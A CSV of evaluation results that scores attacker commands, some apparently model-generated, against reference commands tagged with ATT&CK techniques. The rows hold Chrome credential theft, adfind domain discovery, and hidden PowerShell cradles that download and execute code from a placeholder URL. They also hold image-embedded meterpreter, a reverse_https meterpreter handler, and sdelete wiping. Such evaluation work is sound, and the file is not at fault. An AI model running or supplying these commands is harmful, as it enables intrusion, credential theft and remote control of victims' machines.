file,tool,input_command,matched_command,chrf_score,match_found
command_adfind_TA0007_T1082.txt,adfind,adfind -sc syscrit,"adfind -f ""(objectcategory=group)""`",30.191,True
command_adfind_TA0007_T1082.txt,adfind,adfind -sc syscritl,"adfind -f ""(objectcategory=group)""`",28.866,True
command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump,"adfind -f ""(objectcategory=group)""`",31.38,True
command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump:csv,"adfind -f ""(objectcategory=group)""`",26.86,True
command_adfind_TA0007_T1082.txt,adfind,adfind -sc schemadmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,29.856,True
command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,23.677,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""whoami; ipconfig; systeminfo""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",21.418,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""New-Object System.Net.WebClient).DownloadFile('http://<url>/<file>', '<local_file>')""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",18.747,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://<url>/<script>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",19.065,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Start-Process -FilePath '<file_path>' -ArgumentList '<arguments>'""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",21.867,True
command_metasploit_TA0002_T1203.txt,metasploit,use exploit/windows/misc/client_execution,"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```",32.757,True
